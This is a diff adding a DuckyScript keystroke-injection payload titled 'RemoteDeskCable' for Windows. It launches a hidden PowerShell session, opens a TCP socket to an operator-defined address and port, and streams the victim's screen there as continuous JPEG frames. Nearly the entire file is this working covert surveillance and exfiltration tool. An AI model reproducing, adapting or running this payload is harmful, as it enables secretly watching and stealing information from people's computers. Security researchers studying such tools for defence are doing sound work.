@@ -1,0 +1,43 @@
+REM   Title: RemoteDeskCable
+REM   Version: 3.0
+REM   OS: Windows
+REM   Author: 0iphor13
+REM   Description: Get remote screen access to view targets screen.
+REM   Requirements: Firmware Version 3.0 min
+
+REM   Define your language below
+DUCKY_LANG de
+DELAY 500
+
+REM   Define Address and Port of your receiving system
+DEFINE #ADDRESS '0.0.0.0'
+DEFINE #PORT 1234
+
+DEFINE #NEWLINE `n
+FUNCTION SendHeader()
+STRING function SH([net.sockets.socket] $sk,$length,$code = "
+RANDOM_NUMBER
+RANDOM_NUMBER
+RANDOM_NUMBER
+SPACE
+STRING RemoteDeskCable",$h="text/html",$pl="HTTP/1.1"){$res = "HTTP/1.1 $code`r#NEWLINE" +"Content-Type: multipart/x-mixed-replace; boundary=--boundary`r#NEWLINE#NEWLINE";SSR $sk $res}SH $skt;while ($True){$b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);$g = [System.Drawing.Graphics]::FromImage($b);$g.CopyFromScreen((New-Object System.Drawing.Point(0,0)), (New-Object System.Drawing.Point(0,0)), $b.Size);$g.Dispose();$MS.SetLength(0);$b.Save($MS,([system.drawing.imaging.imageformat]::jpeg));$b.Dispose();$length = $MS.Length;[byte[]] $bt = $MS.ToArray();$str = "#NEWLINE#NEWLINE--boundary#NEWLINE"+"Content-Type: image/jpeg#NEWLINE"+"Content-Length: $length#NEWLINE#NEWLINE";SSR $skt $str;Sr $skt $bt};
+END_FUNCTION
+
+FUNCTION SendResponse()
+STRING function Sr($sk, $sng){if ($sk.Connected){$bts = $sk.Send($sng)}};
+END_FUNCTION
+
+FUNCTION SendStrResponse()
+STRING function SSR($sk, $sng){if ($sk.Connected){$bts = $sk.Send([text.Encoding]::Ascii.GetBytes($sng))}};
+END_FUNCTION
+
+DELAY 1500
+GUI r
+DELAY 500
+STRINGLN powershell -NoP -NonI -w h
+DELAY 500
+STRING Add-Type -AssemblyName System.Windows.Forms;[System.IO.MemoryStream] $MS = New-Object System.IO.MemoryStream;$skt = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp);$skt.Connect(#ADDRESS,#PORT);
+SendResponse()
+SendStrResponse()
+SendHeader()
+STRINGLN $MS.Close()
